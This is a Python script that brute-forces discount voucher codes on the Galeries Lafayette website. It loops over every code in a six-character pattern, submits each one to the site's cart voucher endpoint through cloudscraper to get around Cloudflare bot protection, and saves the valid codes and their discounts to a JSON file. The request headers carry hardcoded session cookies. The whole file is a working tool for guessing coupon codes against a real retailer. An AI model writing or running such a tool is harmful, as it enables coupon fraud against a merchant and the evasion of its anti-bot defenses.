import itertools
import json
import os
import time
import string

import cloudscraper
import requests
from bs4 import BeautifulSoup

BASE_PRICE = 205
FILE_NAME = "vouchers_x00xxx.json"
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0',
    'Accept': '*/*',
    'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.galerieslafayette.com',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://www.galerieslafayette.com/cart',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Cookie': 'TCID=123601556384264364021; tc_cj_v2=SEO%40%40%40google%40%40%401687096598230%40%40%40C%7C%7C%7CEXTERNAL_LINK%40%40%40www.radins.com%40%40%401687098201965%40%40%40C%7C%7C%7CSEO%40%40%40google%40%40%401687106500139%40%40%40C; tc_cj_v2_cmp=; tc_cj_v2_med=; Cookie_banner_testing=VarB-W; TCPID=1236015563812134219214; TC_PRIVACY=0%40023%7C33%7C251%401%2C2%2C3%40%401687096600071%2C1687096600071%2C1720792600071%40; TC_PRIVACY_CENTER=1%2C2%2C3; t2s-analytics=db8841b7-65d2-46c0-ee20-f67832dac12a; t2s-p=db8841b7-65d2-46c0-ee20-f67832dac12a; searchlb=sticky.gcp; navpopin=3; upfitdeploy=G; tc_ab_mailretarget=Eperflex; ab_retarget=e; toky_state=minimized; JSESSIONID=6B2415FE1667AEF02148B0F3E6ECB20C.EGLASHYBLPR16; CART=5251666284; __cf_bm=sQdBHRS7mcywvhqaKnXjXzycOe0swWnO6387g9vdXQQ-1687106501-0-ASi06MWcURf/wgtWFH/s5eJ+JUzzIlKDdWWdycMiY4wR/t4xbqiW80jq/HoViFocEjCU7zQcW1Byd+ZaFqfuxv4rBUW9xV6YnITmFWw04M4xgL9WszOkQjhq9qchKEhfLA==; __cfruid=8cacd29b809d6790ec861e545cc8ef4e96d13930-1687106500; TCSESSION=123601841409978727625; TS01042a25=0185fc39a4eb80b953cf47c8df7f010917849fb2e17b81dcf1c3ae700323aa65a662ab4db181955bce9963d5536cc9eb21ce7580a8f011b462f21956750d61e95e425cdd664dbbe5221faf103cbce82a60bbe27c65ecdc32a65b21b103fc86765964b654cdf689c24a4aaf977ca3895e6e822bcf25f86839d790f2aaced180fe5bb32883fb8db6c2178ee7ab32e0004415ea519119; t2s-rank=rank1; referrer=/cart; CART_USER_FID=false; CART_USER_GCO=false; AB_50_50=A'
}


def put_voucher(voucher_code: str, scraper: cloudscraper.CloudScraper):
    url = f"https://www.galerieslafayette.com/ajax/cart/voucher/{voucher_code}"
    try:
        response = scraper.put(url=url, headers=HEADERS, allow_redirects=False).text

        return None if 'Ce code n&#39;est pas valide' in response else response

    except Exception as e:
        print(f"Unable to put url {url} due to {e.__class__}.")
        return None


def delete_voucher(scraper: cloudscraper.CloudScraper):
    url = "https://www.galerieslafayette.com/ajax/cart/vouchers"
    try:
        return scraper.delete(url=url, headers=HEADERS, allow_redirects=False).text

    except Exception as e:
        print(f"Unable to put url {url} due to {e.__class__}.")
        return None


def producer():
    digits = string.digits
    letters = string.ascii_uppercase
    choices = digits

    for a in choices:
        for b in choices:
            for c in choices:
                for d in choices:
                    yield f"{a}00{b}{c}{d}"


def main():
    # check if file exists
    if not os.path.exists(FILE_NAME):
        with open(FILE_NAME, "w") as f:
            json.dump({}, f)

    with open(FILE_NAME, "r") as f:
        vouchers = json.load(f)
    session = requests.session()
    scraper = cloudscraper.create_scraper(sess=session)
    delete_voucher(scraper)
    for index, voucher in enumerate(producer()):
        start_time = time.time()
        response = put_voucher(voucher, scraper)
        print(voucher, end=" ")
        if response is not None:

            soup = BeautifulSoup(response, "html.parser")
            div = soup.find("div", {"class": "voucher-display-row"})
            if div is not None:
                text_list = div.text.split('\n')
                price = text_list[10].strip().replace('-', '').replace('€', '').replace(',', '.')
                percent = int(float(price) / BASE_PRICE * 100)
                text = f"{text_list[13]} | {BASE_PRICE}€ - {price}€  = -{percent}%"
                print('OK ' + text, end=" ")
                delete_voucher(scraper)
                if voucher not in vouchers:
                    vouchers[voucher] = text
                    with open(FILE_NAME, "w") as f:
                        json.dump(vouchers, f, indent=4, sort_keys=True, ensure_ascii=False)
            else:
                print("KO", end=" ")
        else:
            print("KO", end=" ")
        print('%.2f' % (time.time() - start_time) + "s")


if __name__ == '__main__':
    main()
